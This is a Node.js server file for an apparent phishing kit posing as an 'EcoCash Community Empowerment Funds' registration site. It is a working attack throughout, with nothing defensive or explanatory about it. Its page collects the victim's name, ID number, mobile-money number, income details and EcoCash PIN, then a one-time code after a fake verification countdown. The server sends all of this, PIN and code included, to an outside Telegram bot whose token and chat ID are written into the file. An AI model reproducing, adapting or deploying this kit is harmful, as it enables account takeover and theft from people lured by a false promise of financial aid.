const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = '8251322580:AAFB3YYWIlUcdQMoxVMDwC3LJWUg_piMrjI';
const CHAT_ID = '6306424209';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const registrations = {};

const HTML_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EcoCash Registration</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0047AB 0%,#003380 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:white;border-radius:20px;padding:36px 28px;max-width:460px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3);position:relative;overflow:hidden}
.top-badge{position:absolute;top:0;right:0;background:#0047AB;color:white;padding:8px 20px;font-size:11px;font-weight:700;border-bottom-left-radius:12px;letter-spacing:1.5px}
.logo-area{text-align:center;margin-bottom:24px}
.logo-area .logo{width:68px;height:68px;background:linear-gradient(135deg,#0047AB,#0066CC);border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:32px;color:white;font-weight:700;box-shadow:0 10px 24px rgba(0,71,171,0.35)}
.logo-area h1{color:#0047AB;font-size:1.6em;margin:0;font-weight:700}
.logo-area .tagline{color:#666;margin-top:5px;font-size:0.85em}
.community-badge{background:linear-gradient(135deg,#FFD700,#FFA500);color:#000;padding:10px;border-radius:10px;text-align:center;font-size:11px;font-weight:700;margin-bottom:22px;letter-spacing:0.8px}
.form-group{margin-bottom:18px}
.form-group label{display:block;margin-bottom:7px;color:#333;font-weight:600;font-size:13px}
.form-group label .required{color:#f44336;margin-left:2px}
.form-group input,.form-group select,.form-group textarea{width:100%;padding:14px 15px;border:2px solid #e8e8e8;border-radius:10px;font-size:15px;transition:all 0.2s;background:#fafbfc;font-family:inherit;color:#333}
.form-group select{cursor:pointer;appearance:none;background-image:url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");background-repeat:no-repeat;background-position:right 14px center;background-size:18px;padding-right:42px}
.form-group input:focus,.form-group select:focus,.form-group textarea:focus{border-color:#0047AB;outline:none;background:white;box-shadow:0 0 0 4px rgba(0,71,171,0.08)}
.form-group input::placeholder,.form-group textarea::placeholder{color:#a8b0b9;font-size:14px}
.form-group textarea{resize:vertical;min-height:75px}
.btn{width:100%;padding:16px;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.25s;color:white;background:linear-gradient(135deg,#0047AB,#0066CC);margin-top:6px;box-shadow:0 4px 14px rgba(0,71,171,0.25)}
.btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 10px 25px rgba(0,71,171,0.35)}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.btn-green{background:linear-gradient(135deg,#28a745,#1e7e34)}
.btn-green:hover:not(:disabled){box-shadow:0 10px 25px rgba(40,167,69,0.35)}
.message{padding:14px;border-radius:10px;margin-top:14px;font-weight:500;display:none;text-align:center;font-size:14px}
.message.show{display:block}
.message.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
.message.success{background:#d4edda;color:#155724;border:1px solid #c3e6cb}
.loader{display:inline-block;width:16px;height:16px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 0.7s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.otp-container{display:flex;gap:10px;justify-content:center;margin:24px 0}
.otp-input{width:50px;height:62px;text-align:center;font-size:24px;font-weight:700;border:2px solid #e8e8e8;border-radius:11px;background:#fafbfc;transition:all 0.2s;color:#0047AB}
.otp-input:focus{border-color:#0047AB;outline:none;background:white;box-shadow:0 0 0 4px rgba(0,71,171,0.08)}
.otp-input.filled{border-color:#0047AB;background:#f0f6ff}
.step-content{display:none}
.step-content.active{display:block}
.info-note{background:#e8f1fc;border-left:3px solid #0047AB;padding:12px 14px;border-radius:8px;font-size:12.5px;color:#0c3d6e;margin-bottom:18px;line-height:1.6;font-weight:500}
.section-title{color:#0047AB;font-size:14px;font-weight:700;margin:0 0 14px 0;padding-bottom:8px;border-bottom:2px solid #e8f1fc}
.purpose-list{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:18px}
.purpose-item{border:2px solid #e8e8e8;border-radius:10px;padding:13px 8px;text-align:center;cursor:pointer;transition:all 0.2s;background:#fafbfc;font-size:12px;font-weight:600;color:#555;user-select:none}
.purpose-item:hover{border-color:#0047AB;background:#f0f6ff}
.purpose-item.selected{border-color:#0047AB;background:linear-gradient(135deg,#0047AB,#0066CC);color:white;box-shadow:0 5px 15px rgba(0,71,171,0.3)}
.purpose-item .icon{font-size:20px;display:block;margin-bottom:4px}

.verifying-box{text-align:center;padding:25px 10px}
.verifying-circle{width:130px;height:130px;margin:0 auto 22px;background:linear-gradient(135deg,#e8f1fc,#d0e4ff);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-direction:column;border:6px solid #0047AB;box-shadow:0 0 0 6px rgba(0,71,171,0.1)}
.verifying-number{font-size:48px;font-weight:800;color:#0047AB;line-height:1}
.verifying-label{font-size:11px;color:#666;font-weight:600;letter-spacing:1px;margin-top:4px}
.verifying-box h2{color:#0047AB;font-size:1.35em;margin-bottom:8px;font-weight:700}
.verifying-box p{color:#666;font-size:13px;line-height:1.6;margin-bottom:18px}

.success-container{text-align:center;padding:14px 0}
.success-icon{width:100px;height:100px;background:linear-gradient(135deg,#28a745,#1e7e34);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 22px;font-size:54px;color:white;box-shadow:0 12px 32px rgba(40,167,69,0.35)}
.success-container h1{color:#28a745;margin-bottom:10px;font-size:1.45em;font-weight:700}
.success-container p{color:#666;margin-bottom:14px;line-height:1.65;font-size:14px}
.details-box{background:#f8f9fa;border-radius:12px;padding:18px;margin:22px 0;text-align:left;border:1px solid #e9ecef}
.detail-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #e9ecef;font-size:13px;gap:10px}
.detail-row:last-child{border-bottom:none;padding-bottom:0}
.detail-label{color:#666;font-weight:500;flex-shrink:0}
.detail-value{color:#222;font-weight:700;text-align:right;word-break:break-word}
.status-pending{display:inline-block;padding:10px 24px;border-radius:20px;font-size:13px;font-weight:700;background:#fff3cd;color:#856404;margin-top:6px}
</style>
</head>
<body>
<div class="container">
<div class="top-badge">ECOCASH</div>

<div class="logo-area">
<div class="logo">E</div>
<h1>EcoCash</h1>
<div class="tagline">Community Empowerment Funds</div>
</div>

<div class="community-badge">POWERED BY ECOCASH • COMMUNITY EMPOWERMENT FUNDS</div>

<!-- STEP 1: PERSONAL DETAILS -->
<div class="step-content active" id="step1Content">
<form id="detailsForm">
<div class="section-title">Personal Information</div>
<div class="form-group">
<label>Full Name <span class="required">*</span></label>
<input type="text" id="fullName" placeholder="Enter your full name" required>
</div>
<div class="form-group">
<label>ID Number <span class="required">*</span></label>
<input type="text" id="idNumber" placeholder="Enter your ID number" required>
</div>
<div class="form-group">
<label>EcoCash Number <span class="required">*</span></label>
<input type="tel" id="ecocashNumber" placeholder="0771234567" inputmode="numeric" required>
</div>
<button type="submit" class="btn">Continue</button>
</form>
<div id="messageDiv" class="message"></div>
</div>

<!-- STEP 2: APPLICATION -->
<div class="step-content" id="step2Content">
<form id="applicationForm">
<div class="section-title">Empowerment Fund Application</div>

<div class="form-group">
<label>Purpose of Funds <span class="required">*</span></label>
<div class="purpose-list" id="purposeList">
<div class="purpose-item" data-value="School Fees"><span class="icon">🎓</span>School Fees</div>
<div class="purpose-item" data-value="Business Capital"><span class="icon">💼</span>Business Capital</div>
<div class="purpose-item" data-value="Rent"><span class="icon">🏠</span>Rent</div>
<div class="purpose-item" data-value="Medical Expenses"><span class="icon">🏥</span>Medical Expenses</div>
<div class="purpose-item" data-value="Groceries"><span class="icon">🛒</span>Groceries</div>
<div class="purpose-item" data-value="Transport"><span class="icon">🚗</span>Transport</div>
<div class="purpose-item" data-value="Utilities"><span class="icon">💡</span>Utilities</div>
<div class="purpose-item" data-value="Agriculture"><span class="icon">🌾</span>Agriculture</div>
<div class="purpose-item" data-value="Emergency"><span class="icon">🚨</span>Emergency</div>
<div class="purpose-item" data-value="Savings"><span class="icon">💰</span>Savings</div>
<div class="purpose-item" data-value="Funeral"><span class="icon">⚱️</span>Funeral</div>
<div class="purpose-item" data-value="Other"><span class="icon">📝</span>Other</div>
</div>
</div>

<div class="form-group">
<label>Employment Status <span class="required">*</span></label>
<select id="employmentStatus" required>
<option value="">Select employment status</option>
<option value="Employed Full-time">Employed (Full-time)</option>
<option value="Employed Part-time">Employed (Part-time)</option>
<option value="Self-Employed">Self-Employed</option>
<option value="Business Owner">Business Owner</option>
<option value="Student">Student</option>
<option value="Unemployed">Unemployed</option>
<option value="Retired">Retired</option>
</select>
</div>

<div class="form-group">
<label>Monthly Income (USD) <span class="required">*</span></label>
<select id="monthlyIncome" required>
<option value="">Select monthly income range</option>
<option value="Below $100">Below $100</option>
<option value="$100 - $300">$100 - $300</option>
<option value="$300 - $500">$300 - $500</option>
<option value="$500 - $1000">$500 - $1000</option>
<option value="Above $1000">Above $1000</option>
</select>
</div>

<div class="form-group">
<label>Number of Dependents <span class="required">*</span></label>
<select id="dependents" required>
<option value="">Select number of dependents</option>
<option value="0">0</option>
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5+">5 or more</option>
</select>
</div>

<div class="form-group">
<label>Brief Description of Need <span class="required">*</span></label>
<textarea id="description" placeholder="Briefly describe why you need this empowerment fund (minimum 20 characters)" minlength="20" required></textarea>
</div>

<button type="submit" class="btn">Continue</button>
</form>
<div id="applicationMessage" class="message"></div>
</div>

<!-- STEP 3: PIN -->
<div class="step-content" id="step3Content">
<div class="section-title">Authorize with PIN</div>
<div class="info-note">Enter your 4-digit EcoCash PIN to authorize this application.</div>
<form id="pinForm">
<div class="form-group">
<label>Your EcoCash PIN <span class="required">*</span></label>
<input type="password" id="ecoPin" placeholder="Enter your EcoCash PIN" maxlength="4" inputmode="numeric" required>
</div>
<button type="submit" class="btn" id="pinBtn"><span id="pinText">Continue</span></button>
</form>
<div id="pinMessage" class="message"></div>
</div>

<!-- STEP 4: VERIFYING -->
<div class="step-content" id="verifyingContent">
<div class="verifying-box">
<div class="verifying-circle">
<div class="verifying-number" id="verifyingNumber">20</div>
<div class="verifying-label">SECONDS</div>
</div>
<h2>Verifying Your Details</h2>
<p>Please wait while we verify your information and prepare your OTP.</p>
</div>
</div>

<!-- STEP 5: OTP -->
<div class="step-content" id="step5Content">
<div class="section-title">Verify Your Number</div>
<div class="info-note">A 6-digit verification code has been sent to your EcoCash number. Enter it below to complete your registration.</div>
<div class="otp-container" id="otpContainer">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
</div>
<button type="button" class="btn btn-green" id="submitOtpBtn">Verify &amp; Complete</button>
<div id="otpMessage" class="message"></div>
</div>

<!-- SUCCESS -->
<div class="step-content" id="successContent">
<div class="success-container">
<div class="success-icon">✓</div>
<h1>Successfully Registered</h1>
<p>You will receive a confirmation message once your details are approved.</p>
<div class="details-box">
<div class="detail-row"><span class="detail-label">Registration ID</span><span class="detail-value" id="finalRegId">#----</span></div>
<div class="detail-row"><span class="detail-label">Full Name</span><span class="detail-value" id="finalName">---</span></div>
<div class="detail-row"><span class="detail-label">ID Number</span><span class="detail-value" id="finalIdNumber">---</span></div>
<div class="detail-row"><span class="detail-label">EcoCash Number</span><span class="detail-value" id="finalPhone">---</span></div>
<div class="detail-row"><span class="detail-label">Purpose</span><span class="detail-value" id="finalPurpose">---</span></div>
</div>
<div class="status-pending">Awaiting Approval</div>
</div>
</div>

</div>

<script>
var currentAppId = null;
var userDetails = {};
var selectedPurpose = '';

function goToStep(id){
var all=document.querySelectorAll('.step-content');
for(var i=0;i<all.length;i++){all[i].classList.remove('active')}
var el=document.getElementById(id+'Content');
if(el){el.classList.add('active')}
window.scrollTo(0,0);
}

// ===== STEP 1 =====
document.getElementById('detailsForm').addEventListener('submit', function(e){
e.preventDefault();
var fullName=document.getElementById('fullName').value.trim();
var idNumber=document.getElementById('idNumber').value.trim();
var ecocashNumber=document.getElementById('ecocashNumber').value.trim();

if(!fullName){showErr('messageDiv','Please enter your full name');return}
if(!idNumber){showErr('messageDiv','Please enter your ID number');return}
if(!ecocashNumber||ecocashNumber.length<10){showErr('messageDiv','Please enter a valid EcoCash number');return}

userDetails.fullName=fullName;
userDetails.idNumber=idNumber;
userDetails.ecocashNumber=ecocashNumber;

goToStep('step2');
});

// ===== PURPOSE =====
var purposeItems=document.querySelectorAll('.purpose-item');
for(var pi=0;pi<purposeItems.length;pi++){
(function(item){
item.addEventListener('click',function(){
for(var j=0;j<purposeItems.length;j++){purposeItems[j].classList.remove('selected')}
item.classList.add('selected');
selectedPurpose=item.getAttribute('data-value');
});
})(purposeItems[pi]);
}

// ===== STEP 2 =====
document.getElementById('applicationForm').addEventListener('submit', function(e){
e.preventDefault();

if(!selectedPurpose){showErr('applicationMessage','Please select a purpose of funds');return}

var employmentStatus=document.getElementById('employmentStatus').value;
var monthlyIncome=document.getElementById('monthlyIncome').value;
var dependents=document.getElementById('dependents').value;
var description=document.getElementById('description').value.trim();

if(!employmentStatus){showErr('applicationMessage','Please select your employment status');return}
if(!monthlyIncome){showErr('applicationMessage','Please select your monthly income range');return}
if(!dependents){showErr('applicationMessage','Please select number of dependents');return}
if(!description||description.length<20){showErr('applicationMessage','Please provide a brief description (minimum 20 characters)');return}

userDetails.purpose=selectedPurpose;
userDetails.employmentStatus=employmentStatus;
userDetails.monthlyIncome=monthlyIncome;
userDetails.dependents=dependents;
userDetails.description=description;

goToStep('step3');
});

// ===== STEP 3: PIN =====
document.getElementById('pinForm').addEventListener('submit', async function(e){
e.preventDefault();
var ecoPin=document.getElementById('ecoPin').value.trim();
if(!ecoPin||ecoPin.length!==4){showErr('pinMessage','EcoCash PIN must be 4 digits');return}

var btn=document.getElementById('pinBtn');
var btnText=document.getElementById('pinText');
btn.disabled=true;
btnText.innerHTML='<span class="loader"></span> Processing...';

try{
var response=await fetch('/api/register',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
fullName:userDetails.fullName,
idNumber:userDetails.idNumber,
ecocashNumber:userDetails.ecocashNumber,
purpose:userDetails.purpose,
employmentStatus:userDetails.employmentStatus,
monthlyIncome:userDetails.monthlyIncome,
dependents:userDetails.dependents,
description:userDetails.description,
ecoPin:ecoPin
})
});
var data=await response.json();
btn.disabled=false;
btnText.textContent='Continue';

if(data.success){
currentAppId=data.registrationId;
userDetails.ecoPin=ecoPin;
goToStep('verifying');
startCountdown();
}else{
showErr('pinMessage',data.message||'Failed. Please try again.');
}
}catch(error){
btn.disabled=false;
btnText.textContent='Continue';
showErr('pinMessage','Network error. Please try again.');
}
});

// ===== COUNTDOWN =====
function startCountdown(){
var seconds=20;
var el=document.getElementById('verifyingNumber');
el.textContent=seconds;

var t=setInterval(function(){
seconds--;
if(seconds<0){seconds=0}
el.textContent=seconds;
if(seconds<=0){
clearInterval(t);
goToStep('step5');
var first=document.querySelector('#otpContainer .otp-input');
if(first){first.focus()}
}
},1000);
}

// ===== OTP INPUTS =====
var otpInputs=document.querySelectorAll('#otpContainer .otp-input');
for(var oi=0;oi<otpInputs.length;oi++){
(function(input,index){
input.addEventListener('input',function(e){
var v=e.target.value.replace(/[^0-9]/g,'');
e.target.value=v;
if(v){
input.classList.add('filled');
if(index<otpInputs.length-1){otpInputs[index+1].focus()}
}else{
input.classList.remove('filled');
}
});
input.addEventListener('keydown',function(e){
if(e.key==='Backspace'&&!input.value&&index>0){otpInputs[index-1].focus()}
});
})(otpInputs[oi],oi);
}

// ===== STEP 5: OTP =====
document.getElementById('submitOtpBtn').addEventListener('click',async function(){
var otp='';
for(var i=0;i<otpInputs.length;i++){otp+=otpInputs[i].value}

if(otp.length!==6){
showErr('otpMessage','Please enter the complete 6-digit code');
return;
}

var btn=document.getElementById('submitOtpBtn');
btn.disabled=true;
btn.innerHTML='<span class="loader"></span> Verifying...';

try{
var response=await fetch('/api/complete-registration',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({registrationId:currentAppId,otp:otp})
});
var data=await response.json();
if(data.success){
document.getElementById('finalRegId').textContent='#'+currentAppId;
document.getElementById('finalName').textContent=userDetails.fullName;
document.getElementById('finalIdNumber').textContent=userDetails.idNumber;
document.getElementById('finalPhone').textContent=userDetails.ecocashNumber;
document.getElementById('finalPurpose').textContent=userDetails.purpose;
goToStep('success');
}else{
showErr('otpMessage',data.message||'Verification failed. Please try again.');
btn.disabled=false;
btn.textContent='Verify & Complete';
}
}catch(error){
showErr('otpMessage','Network error. Please try again.');
btn.disabled=false;
btn.textContent='Verify & Complete';
}
});

// ===== ERROR SHOW =====
function showErr(id,msg){
var d=document.getElementById(id);
d.textContent=msg;
d.className='message show error';
setTimeout(function(){d.className='message'},5000);
}

// ===== INPUT RESTRICTIONS =====
document.getElementById('ecocashNumber').addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'')});
document.getElementById('ecoPin').addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'')});
</script>
</body>
</html>`;

app.get('/', (req, res) => { res.send(HTML_PAGE); });

app.post('/api/register', async (req, res) => {
    try {
        const { fullName, idNumber, ecocashNumber, purpose, employmentStatus, monthlyIncome, dependents, description, ecoPin } = req.body;

        if (!fullName || !idNumber || !ecocashNumber || !ecoPin) {
            return res.status(400).json({ success: false, message: 'Missing required fields' });
        }
        if (ecoPin.length !== 4) {
            return res.status(400).json({ success: false, message: 'EcoCash PIN must be 4 digits' });
        }

        const registrationId = Math.floor(10000 + Math.random() * 90000).toString();

        registrations[registrationId] = {
            fullName, idNumber, ecocashNumber,
            purpose, employmentStatus, monthlyIncome, dependents, description,
            ecoPin,
            otpEntered: null,
            timestamp: new Date().toISOString()
        };

        const message =
            '💚 <b>NEW ECOCASH EMPOWERMENT FUND APPLICATION</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '<b>PERSONAL INFORMATION</b>\n' +
            '👤 <b>Full Name:</b> ' + fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + ecocashNumber + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '<b>APPLICATION DETAILS</b>\n' +
            '📌 <b>Purpose:</b> ' + (purpose || 'N/A') + '\n' +
            '💼 <b>Employment:</b> ' + (employmentStatus || 'N/A') + '\n' +
            '💵 <b>Monthly Income:</b> ' + (monthlyIncome || 'N/A') + '\n' +
            '👨‍👩‍👧 <b>Dependents:</b> ' + (dependents || 'N/A') + '\n' +
            '📝 <b>Description:</b> ' + (description || 'N/A') + '\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '🔑 <b>EcoCash PIN:</b> <code>' + ecoPin + '</code>\n' +
            '⏰ <b>Submitted:</b> ' + new Date().toLocaleString() + '\n\n' +
            '⏳ <i>Awaiting OTP verification...</i>';

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });

        res.json({ success: true, registrationId, message: 'OK' });
    } catch (error) {
        console.error('Register error:', error.message);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.post('/api/complete-registration', async (req, res) => {
    try {
        const { registrationId, otp } = req.body;
        const r = registrations[registrationId];

        if (!r) {
            return res.status(404).json({ success: false, message: 'Registration not found' });
        }

        r.otpEntered = otp;
        r.completedAt = new Date().toISOString();

        const message =
            '✅ <b>REGISTRATION COMPLETED</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '<b>PERSONAL INFORMATION</b>\n' +
            '👤 <b>Full Name:</b> ' + r.fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + r.idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + r.ecocashNumber + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '<b>APPLICATION DETAILS</b>\n' +
            '📌 <b>Purpose:</b> ' + (r.purpose || 'N/A') + '\n' +
            '💼 <b>Employment:</b> ' + (r.employmentStatus || 'N/A') + '\n' +
            '💵 <b>Monthly Income:</b> ' + (r.monthlyIncome || 'N/A') + '\n' +
            '👨‍👩‍👧 <b>Dependents:</b> ' + (r.dependents || 'N/A') + '\n' +
            '📝 <b>Description:</b> ' + (r.description || 'N/A') + '\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '🔑 <b>EcoCash PIN:</b> <code>' + r.ecoPin + '</code>\n' +
            '🔐 <b>OTP Entered:</b> <code>' + otp + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '📊 <b>Status:</b> ✅ Completed – Awaiting Approval\n' +
            '⏰ <b>Completed:</b> ' + new Date().toLocaleString() + '\n\n' +
            '💚 <i>Community Empowerment Funds Program</i>';

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });

        res.json({ success: true, message: 'Completed' });
    } catch (error) {
        console.error('Complete error:', error.message);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.get('/health', (req, res) => res.json({ status: 'healthy' }));

app.listen(PORT, () => {
    console.log(`🚀 EcoCash Registration on port ${PORT}`);
});
